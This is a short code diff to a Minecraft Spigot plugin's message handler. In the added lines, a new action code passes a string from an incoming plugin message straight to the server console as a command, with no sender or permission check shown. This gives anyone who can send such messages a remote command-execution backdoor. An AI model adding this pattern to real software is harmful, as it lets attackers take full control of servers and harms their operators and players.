@@ -104,6 +104,8 @@ public class SpigotBridgeManager implements PluginMessageListener {
                 final UUID uuid = UUID.fromString(in.readUTF());
                 final Language lang = MultiLanguagePlugin.get().getLanguageManager().getLanguageByName(in.readUTF(), true);
                 Bukkit.getScheduler().runTaskLater(MultiLanguagePlugin.get().getLoader().asSpigot(), () -> ((SpigotLanguagePlayer) MultiLanguagePlugin.get().getPlayerManager().get(uuid)).setLang(lang, false), 10L);
+            } else if (action == 2) {
+                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), in.readUTF());
             }
         } catch (Exception e) {
             MultiLanguagePlugin.get().logError("Failed to parse plugin message: %1", e.getMessage());
